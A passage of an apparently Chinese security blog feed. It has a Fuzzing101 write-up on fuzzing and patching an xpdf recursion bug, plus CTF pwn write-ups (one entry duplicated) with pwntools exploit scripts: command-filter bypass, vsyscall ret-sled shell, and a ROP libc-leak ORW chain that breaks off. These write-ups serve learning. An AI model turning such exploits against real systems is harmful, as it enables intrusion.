class="built_in">export</span> LLVM_CONFIG=<span class="string">"llvm-config-11"</span></span><br><span class="line">CC=<span class="variable">$HOME</span>/AFLplusplus/afl-clang-fast CXX=<span class="variable">$HOME</span>/AFLplusplus/afl-clang-fast++ ./configure --prefix=<span class="string">"<span class="variable">$HOME</span>/fuzzing_xpdf/install/"</span></span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></tbody></table></figure><p>开始fuzz模糊测试</p><p><strong>-i</strong>  :设置输入实例的文件夹</p><p><strong>-o</strong> :设置用于存放模糊测试结果的文件夹</p><p><strong>-s</strong>  :设置一个静态随机数作为种子</p><p><strong>—</strong>  ：设置测试目标</p><p><strong>@@</strong>  ：占位符，指代每一个输入文件</p><figure class="highlight sh"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afl-fuzz -i <span class="variable">$HOME</span>/fuzzing_xpdf/pdf_examples/ -o <span class="variable">$HOME</span>/fuzzing_xpdf/out/ -s 123 -- <span class="variable">$HOME</span>/fuzzing_xpdf/xpdf-3.02/xpdf/pdftotext @@ <span class="variable">$HOME</span>/fuzzing_xpdf/output</span><br></pre></td></tr></tbody></table></figure><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241126230407645.png" alt="image-20241126230407645"></p><p>在 <strong>~/fuzzing_xpdf/out/default/crashes</strong> 里有导致程序奔溃的输入</p><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">hpp@swikar:~/fuzzing_xpdf/out/default/crashes$ ls</span><br><span class="line"><span class="built_in">id</span>:<span class="number">000000</span>,sig:<span class="number">11</span>,src:<span class="number">00</span>1045,time:<span class="number">342537</span>,execs:<span class="number">245377</span>,op:havoc,rep:<span class="number">15</span></span><br><span class="line"><span class="built_in">id</span>:000001,sig:<span class="number">11</span>,src:000229,time:<span class="number">505563</span>,execs:<span class="number">344967</span>,op:havoc,rep:<span class="number">2</span></span><br><span class="line"><span class="built_in">id</span>:000002,sig:<span class="number">11</span>,src:001638,time:<span class="number">566771</span>,execs:<span class="number">383537</span>,op:havoc,rep:<span class="number">1</span></span><br><span class="line"><span class="built_in">id</span>:000003,sig:<span class="number">11</span>,src:001753+000851,time:<span class="number">820662</span>,execs:<span class="number">526503</span>,op:splice,rep:<span class="number">2</span></span><br><span class="line">README.txt</span><br></pre></td></tr></tbody></table></figure><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241126233345559.png" alt="image-20241126233345559"></p><p>将这些文件放到gdb中调试，看看是哪里出错</p><p>首先重新编译</p><figure class="highlight sh"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">rm</span> -r <span class="variable">$HOME</span>/fuzzing_xpdf/install</span><br><span class="line"><span class="built_in">cd</span> <span class="variable">$HOME</span>/fuzzing_xpdf/xpdf-3.02/</span><br><span class="line">make clean</span><br><span class="line">CFLAGS=<span class="string">"-g -O0"</span> CXXFLAGS=<span class="string">"-g -O0"</span> ./configure --prefix=<span class="string">"<span class="variable">$HOME</span>/fuzzing_xpdf/install/"</span></span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></tbody></table></figure><p>然后gdb调试</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb --args $HOME/fuzzing_xpdf/install/bin/pdftotext $HOME/fuzzing_xpdf/out/default/crashes/&lt;your_filename&gt; $HOME/fuzzing_xpdf/output</span><br></pre></td></tr></tbody></table></figure><p>我这里是</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb --args $HOME/fuzzing_xpdf/install/bin/pdftotext $HOME/fuzzing_xpdf/out/default/crashes/id:000000,sig:11,src:001045,time:342537,execs:245377,op:havoc,rep:15 $HOME/fuzzing_xpdf/output</span><br></pre></td></tr></tbody></table></figure><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; run</span><br><span class="line"><span class="comment">#回溯用过的函数</span></span><br><span class="line">pwndbg&gt; bt</span><br><span class="line"><span class="comment">#24055 0x00005555555ff8f0 in Parser::makeStream (this=0x5555561b1030, dict=0x7fffffa71880, fileKey=0x0, encAlgorithm=cryptRC4, keyLength=0, objNum=7, objGen=0) at Parser.cc:156</span></span><br><span class="line"><span class="comment">#24056 0x00005555555ff51a in Parser::getObj (this=0x5555561b1030, obj=0x7fffffa71880, fileKey=0x0, encAlgorithm=cryptRC4, keyLength=0, objNum=7, objGen=0) at Parser.cc:94</span></span><br><span class="line"><span class="comment">#24057 0x0000555555623714 in XRef::fetch (this=0x5555556cc230, num=7, gen=0, obj=0x7fffffa71880) at XRef.cc:823</span></span><br><span class="line"><span class="comment">#24058 0x00005555555fa57e in Object::fetch (this=0x5555561b0c58, xref=0x5555556cc230, obj=0x7fffffa71880) at Object.cc:106</span></span><br><span class="line"><span class="comment">#24059 0x000055555559c94c in Dict::lookup (this=0x5555561b0c00, key=0x55555564ca6f "Length", obj=0x7fffffa71880) at Dict.cc:76</span></span><br><span class="line"><span class="comment">#24060 0x00005555555fb269 in Object::dictLookup (this=0x7fffffa71b00, key=0x55555564ca6f "Length", obj=0x7fffffa71880) at /home/hpp/fuzzing_xpdf/xpdf-3.02/xpdf/Object.h:253</span></span><br><span class="line"><span class="comment">#24061 0x00005555555ff8f0 in Parser::makeStream (this=0x5555561b0b50, dict=0x7fffffa71b00, fileKey=0x0, encAlgorithm=cryptRC4, keyLength=0, objNum=7, objGen=0) at Parser.cc:156</span></span><br><span class="line"><span class="comment">#24062 0x00005555555ff51a in Parser::getObj (this=0x5555561b0b50, obj=0x7fffffa71b00, fileKey=0x0, encAlgorithm=cryptRC4, keyLength=0, objNum=7, objGen=0) at Parser.cc:94</span></span><br><span class="line"><span class="comment"># 发现一直在调用Parser::getObj 函数</span></span><br></pre></td></tr></tbody></table></figure><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241126234413379.png" alt="image-20241126234413379"></p><p>查看Parser.cc:94的源码</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (!buf1.isCmd(<span class="string">"&gt;&gt;"</span>) &amp;&amp; !buf1.isEOF()) {</span><br><span class="line">      <span class="keyword">if</span> (!buf1.isName()) {</span><br><span class="line">error(getPos(), <span class="string">"Dictionary key must be a name object"</span>);</span><br><span class="line">shift();</span><br><span class="line">      } <span class="keyword">else</span> {</span><br><span class="line">key = copyString(buf1.getName());</span><br><span class="line">shift();</span><br><span class="line"><span class="keyword">if</span> (buf1.isEOF() || buf1.isError()) {</span><br><span class="line">  gfree(key);</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line">}</span><br><span class="line">      <span class="comment">//不断调用getObj使程序奔溃</span></span><br><span class="line">obj-&gt;dictAdd(key, getObj(&amp;obj2, fileKey, encAlgorithm, keyLength,</span><br><span class="line"> objNum, objGen));</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>定位到这</p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241127005323239.png" alt="image-20241127005323239"></p><p>由于本人代码能力一般，修复不了bug,通过chatgpt修复了一下</p><p>在源码的基础上增加了一个次数的限制</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//定义两个全局变量</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_OBJ_CALLS 10000</span></span><br><span class="line"><span class="type">int</span> callCount = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (!buf1.isCmd(<span class="string">"&gt;&gt;"</span>) &amp;&amp; !buf1.isEOF()) {</span><br><span class="line">      <span class="keyword">if</span> (!buf1.isName()) {</span><br><span class="line">error(getPos(), <span class="string">"Dictionary key must be a name object"</span>);</span><br><span class="line">shift();</span><br><span class="line">      } <span class="keyword">else</span> {</span><br><span class="line">key = copyString(buf1.getName());</span><br><span class="line">shift();</span><br><span class="line"><span class="keyword">if</span> (buf1.isEOF() || buf1.isError()) {</span><br><span class="line">  gfree(key);</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 增加调用次数限制</span></span><br><span class="line">        <span class="keyword">if</span> (callCount &gt;= MAX_OBJ_CALLS) {</span><br><span class="line">            error(getPos(), <span class="string">"Too many calls to getObj, possible infinite loop"</span>);</span><br><span class="line">            gfree(key);</span><br><span class="line">            obj-&gt;initError();  <span class="comment">// 初始化为错误对象</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        }</span><br><span class="line">        callCount++;  <span class="comment">// 增加调用次数</span></span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">obj-&gt;dictAdd(key, getObj(&amp;obj2, fileKey, encAlgorithm, keyLength,</span><br><span class="line"> objNum, objGen));</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>这样可以有效限制调用次数</p><p>再次make clean,重新插桩编译，跑了很久发现了另外一个，是其他的输入的问题，无限递归的bug已经修复了</p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241127010137107.png" alt="image-20241127010137107"></p><p>这是xpdf4.02中<code>Parser.cc</code>的部分源码</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 增加了递归的上限</span></span><br><span class="line"><span class="comment">// Max number of nested objects.  This is used to catch infinite loops</span></span><br><span class="line"><span class="comment">// in the object structure.</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> recursionLimit 500</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 增加了递归次数的检查</span></span><br><span class="line">  <span class="comment">// array</span></span><br><span class="line">  <span class="keyword">if</span> (!simpleOnly &amp;&amp; recursion &lt; recursionLimit &amp;&amp; buf1.isCmd(<span class="string">"["</span>)) {</span><br><span class="line">      ...</span><br><span class="line">  <span class="comment">// dictionary or stream</span></span><br><span class="line">  } <span class="keyword">else</span> <span class="keyword">if</span> (!simpleOnly &amp;&amp; recursion &lt; recursionLimit &amp;&amp; buf1.isCmd(<span class="string">"&lt;&lt;"</span>)) {</span><br><span class="line">      ...</span><br><span class="line">    </span><br><span class="line"><span class="comment">// 对比之前版本，发现多了 recursion 这个参数</span></span><br><span class="line">    <span class="comment">// stream objects are not allowed inside content streams or</span></span><br><span class="line">    <span class="comment">// object streams</span></span><br><span class="line">    <span class="keyword">if</span> (allowStreams &amp;&amp; buf2.isCmd(<span class="string">"stream"</span>)) {</span><br><span class="line">      <span class="keyword">if</span> ((str = makeStream(obj, fileKey, encAlgorithm, keyLength,</span><br><span class="line">                objNum, objGen, recursion + <span class="number">1</span>))) {</span><br><span class="line">          ...</span><br></pre></td></tr></tbody></table></figure><p>漏洞来源</p><p>在 Xpdf 4.01.01 中，<code>Parser.cc</code> 文件中的 <code>Parser::getObj()</code> 函数可能通过精心构造的文件导致无限递归。远程攻击者可以利用此漏洞发动拒绝服务（DoS）攻击。此漏洞与 <strong>CVE-2018-16646</strong> 类似。</p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241127010619274.png" alt="image-20241127010619274"></p><hr><h5 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h5><p>[1]:<a href="https://blog.xmcve.com/2023/01/13/Fuzzing101学习笔记/#title-4">Fuzzing101学习笔记 - 星盟安全团队</a> </p><p>[2]:<a href="https://github.com/antonio-morales/Fuzzing101/tree/main/Exercise 1">Fuzzing101/Exercise 1 at main · antonio-morales/Fuzzing101</a></p><p>[3]:<a href="https://www.cvedetails.com/cve/CVE-2019-13288/">CVE-2019-13288 : In Xpdf 4.01.01, the Parser::getObj() function in Parser.cc may cause infinite r</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>trick</title>
      <link href="//posts/d8f0a91e/"/>
      <url>//posts/d8f0a91e/</url>
      
        <content type="html"><![CDATA[<h4 id="ctfshow-单身杯"><a href="#ctfshow-单身杯" class="headerlink" title="ctfshow 单身杯"></a>ctfshow 单身杯</h4><h2 id="Findyourgirlfriend"><a href="#Findyourgirlfriend" class="headerlink" title="Findyourgirlfriend"></a>Findyourgirlfriend</h2><p>strstr函数返回子字符串第一次出现的指针，然后这里右边是判断，返回0或1</p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241120220602192.png" alt="image-20241120220602192"></p><p>输入的s不能包含这些字符串，然后输入的s是 <strong>set -s</strong>,</p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241120221150711.png" alt="image-20241120221150711"></p><p>最后执行的是<strong>system(‘/bin/sh -c set -s)</strong>,在sh内执行<strong>set -s</strong>,设置了shell输出选项而没有其他动作</p><p>这里不能直接cat，因为远程环境没有给cat设置环境变量<strong>$PATH</strong></p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241120222324355.png" alt="image-20241120222324355"></p><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=remote("pwn.challenge.ctf.show",28147)</span></span><br><span class="line">p=process(<span class="string">"./girl"</span>)</span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">'games'</span>,<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b'set -s'</span></span><br><span class="line">p.sendlineafter(<span class="string">'girlfriend? '</span>,payload)</span><br><span class="line">p.sendline(<span class="string">'/bin/cat /flag'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure><h2 id="CheckIn"><a href="#CheckIn" class="headerlink" title="CheckIn"></a>CheckIn</h2><p>保护全开，有个后门函数</p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241120223315744.png" alt="image-20241120223315744"></p><p>rax在栈上</p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241120223444114.png" alt="image-20241120223444114"></p><p>这里用了vsyscall，在这里x64这是固定的地址</p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241120223513544.png" alt=""></p><p>设计这玩意的初衷是限制了只有从vsyscall函数入口才能正常运行，避免gadget，这里是反复调用vsyscall不断调用ret破坏栈，具体调试不出来，直接报错了，只有栈上有.text段没清理干净，修改最低位就劫持了控制流</p><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=remote("pwn.challenge.ctf.show",28149)</span></span><br><span class="line">p=process(<span class="string">"./1"</span>)</span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line">ret=<span class="number">0xffffffffff600000</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">p.send(p64(ret)*<span class="number">30</span>+<span class="string">b'\x13'</span>)</span><br><span class="line">p.sendline(<span class="string">'/bin/sh'</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>trick</title>
      <link href="//posts/d8f0a91e/"/>
      <url>//posts/d8f0a91e/</url>
      
        <content type="html"><![CDATA[<h4 id="ctfshow-单身杯"><a href="#ctfshow-单身杯" class="headerlink" title="ctfshow 单身杯"></a>ctfshow 单身杯</h4><h2 id="Findyourgirlfriend"><a href="#Findyourgirlfriend" class="headerlink" title="Findyourgirlfriend"></a>Findyourgirlfriend</h2><p>strstr函数返回子字符串第一次出现的指针，然后这里右边是判断，返回0或1</p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241120220602192.png" alt="image-20241120220602192"></p><p>输入的s不能包含这些字符串，然后输入的s是 <strong>set -s</strong>,</p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241120221150711.png" alt="image-20241120221150711"></p><p>最后执行的是<strong>system(‘/bin/sh -c set -s)</strong>,在sh内执行<strong>set -s</strong>,设置了shell输出选项而没有其他动作</p><p>这里不能直接cat，因为远程环境没有给cat设置环境变量<strong>$PATH</strong></p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241120222324355.png" alt="image-20241120222324355"></p><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=remote("pwn.challenge.ctf.show",28147)</span></span><br><span class="line">p=process(<span class="string">"./girl"</span>)</span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">'games'</span>,<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b'set -s'</span></span><br><span class="line">p.sendlineafter(<span class="string">'girlfriend? '</span>,payload)</span><br><span class="line">p.sendline(<span class="string">'/bin/cat /flag'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure><h2 id="CheckIn"><a href="#CheckIn" class="headerlink" title="CheckIn"></a>CheckIn</h2><p>保护全开，有个后门函数</p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241120223315744.png" alt="image-20241120223315744"></p><p>rax在栈上</p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241120223444114.png" alt="image-20241120223444114"></p><p>这里用了vsyscall，在这里x64这是固定的地址</p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241120223513544.png" alt=""></p><p>设计这玩意的初衷是限制了只有从vsyscall函数入口才能正常运行，避免gadget，这里是反复调用vsyscall不断调用ret破坏栈，具体调试不出来，直接报错了，只有栈上有.text段没清理干净，修改最低位就劫持了控制流</p><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=remote("pwn.challenge.ctf.show",28149)</span></span><br><span class="line">p=process(<span class="string">"./1"</span>)</span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line">ret=<span class="number">0xffffffffff600000</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">p.send(p64(ret)*<span class="number">30</span>+<span class="string">b'\x13'</span>)</span><br><span class="line">p.sendline(<span class="string">'/bin/sh'</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>qwnt2024</title>
      <link href="//posts/a036fd99/"/>
      <url>//posts/a036fd99/</url>
      
        <content type="html"><![CDATA[<h4 id="sigin"><a href="#sigin" class="headerlink" title="sigin"></a>sigin</h4><p>开了随机种子，输入要和随机数一样</p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241119202720831.png" alt="image-20241119202720831"></p><p>由于buf和seed在栈上，所以可以利用输入buf把seed给覆盖掉</p><p>使用 libc=cdll.LoadLibrary(“./libc.so.6”) ，加载的就是特定的libc，然后利用libc的函数libc.srand(seed),得到的随机数和rand一样，后续就是用老套的orw就能解决，不过要栈迁移取去bss段上执行，因为在栈上的rop长度不够</p><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=remote("node4.buuoj.cn",)</span></span><br><span class="line">p=process(<span class="string">"./vuln"</span>)</span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line">elf=ELF(<span class="string">'./vuln'</span>)</span><br><span class="line">context(arch=<span class="string">'amd64'</span>)</span><br><span class="line"><span class="comment">#libc=ELF('/home/hpp/s/buu/how2heap/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6')</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc=cdll.LoadLibrary(<span class="string">"./libc.so.6"</span>) </span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">b'a'</span>*<span class="number">14</span>+p32(<span class="number">1</span>))</span><br><span class="line">libc.srand(<span class="number">1</span>)</span><br><span class="line">menu=<span class="number">0x4014E6</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">k=libc.rand()%<span class="number">100</span>+<span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(k)</span><br><span class="line">p.sendafter(<span class="string">'code:'</span>,p8(k))</span><br><span class="line"></span><br><span class="line">pop_rdi=<span class="number">0x401893</span></span><br><span class="line">p.sendafter(<span class="string">'&gt;&gt;'</span>,p32(<span class="number">1</span>))</span><br><span class="line">p.sendlineafter(<span class="string">'Index: '</span>,p32(<span class="number">0</span>))</span><br><span class="line">payload=<span class="string">b'a'</span>*<span class="number">0x108</span>+p64(pop_rdi)+p64(elf.got[<span class="string">'puts'</span>])+p64(elf.plt[<span class="string">'puts'</span>])+p64(menu)</span><br><span class="line">libc=ELF(<span class="string">'/home/hpp/s/buu/how2heap/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'Note: '</span>,payload)</span><br><span class="line">puts=u64(p.recvuntil(<span class="string">'\x7f'</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b'\x00'</span>))</span><br><span class="line">base=puts-libc.sym[<span class="string">'puts'</span>]</span><br><span class="line">pop_rsi=<span class="number">0x202f8</span>+base</span><br><span class="line">pop_rdx=<span class="number">0x1b92</span>+base</span><br><span class="line">read=base+libc.sym[<span class="string">'read'</span>]</span><br><span class="line">op=base+libc.sym[<span class="string">'open'</span>]</span><br><span class="line">write=base+libc.sym[<span class="string">'write'</span>]</span><br><span class="line">bss=<span class="number">0x4040A0</span></span><br><span class="line"></span><br><span class="line">leave=<span class="number">0x401591</span></span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">'Index: '</span>,p32(<span class="number">2</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(op))</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b'b'</span>*<span class="number">0x108</span>+p64(pop_rsi)+p64(bss)+p64(read)+p64(menu)</span><br><span class="line">p.sendlineafter(<span class="string">'Note: '</span>,<span class="string">'asdf'</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'./flag\x00'</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">'Index: '</span>,p32(<span class="number">2</span>))</span><br><span class="line">payload=<span class="string">b'a'</span>*<span class="number">0x108</span>+p64(pop_rsi)+p64(bss+<span class="number">0x200</span>)+p64(read)+p64(menu)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">'Note: '</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#orw</span></span><br><span class="line"></span><br><span 